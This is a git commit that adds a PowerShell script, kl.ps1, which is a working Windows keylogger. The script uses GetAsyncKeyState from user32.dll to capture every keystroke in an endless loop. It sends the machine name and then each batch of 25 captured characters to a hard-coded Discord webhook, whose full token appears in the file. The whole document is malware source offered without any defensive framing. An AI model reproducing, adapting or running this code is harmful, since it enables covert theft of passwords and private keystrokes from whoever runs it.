9e882490f32d177ad9b3b9abc45c136f8f7de969
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 00:41:29 +0100

    Add files via upload

---
+++ kl.ps1
@@ -0,0 +1,27 @@
+$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
+
+iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+
+$code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+}
+'@
+
+Add-Type $code
+
+$buf = ''
+while($true){
+    Start-Sleep -Milliseconds 40
+    for($i=8;$i -le 254;$i++){
+        if([Win32]::GetAsyncKeyState($i) -eq -32767){
+            $buf += [char]$i
+            if($buf.Length -ge 25){
+                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+                $buf = ''
+            }
+        }
+    }
+}
